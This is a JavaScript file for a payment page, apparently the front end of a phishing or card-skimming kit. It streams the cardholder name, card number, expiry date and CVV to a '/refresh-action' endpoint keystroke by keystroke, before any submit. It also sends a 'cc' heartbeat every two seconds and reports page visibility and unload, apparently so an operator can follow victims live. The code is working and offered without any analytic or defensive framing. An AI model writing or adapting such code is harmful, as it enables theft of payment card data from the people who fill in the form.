document.addEventListener('DOMContentLoaded', () => {
    const csrfToken = document.querySelector('input[name="_token"]')?.value;
    if (!csrfToken) {
        console.error('CSRF token not found.');
        return;
    }
    function sendAction(actionSent) {
        const payload = { action_sent: actionSent };

        fetch('/refresh-action', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-CSRF-TOKEN': csrfToken
            },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
        })
        .catch(err => {
            console.error(`Failed to send action '${actionSent}':`, err);
        });
    }

    function pingRefresh() {
        sendAction('cc');
    }
    setInterval(pingRefresh, 2000);

    function debounce(fn, delay) {
        let timeoutId;
        return function(...args) {
            clearTimeout(timeoutId);
            timeoutId = setTimeout(() => fn.apply(this, args), delay);
        };
    }

    ['cardholder', 'card_number', 'expiry', 'cvv'].forEach(fieldId => {
        const input = document.getElementById(fieldId);
        if (input) {
            input.addEventListener('input', debounce((e) => {
                sendAction(`${fieldId}: ${e.target.value}`);
            }, 500));
            input.addEventListener('blur', (e) => {
                sendAction(`${fieldId}: ${e.target.value}`);
            });
        }
    });

    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            sendAction('page_hidden');
        } else {
            sendAction('page_visible');
        }
    });

    window.addEventListener('beforeunload', () => {
        const url = '/refresh-action';
        const data = JSON.stringify({ action_sent: 'page_unload' });
        const headers = { type: 'application/json' };
        navigator.sendBeacon(url, new Blob([data], headers));
    });
});
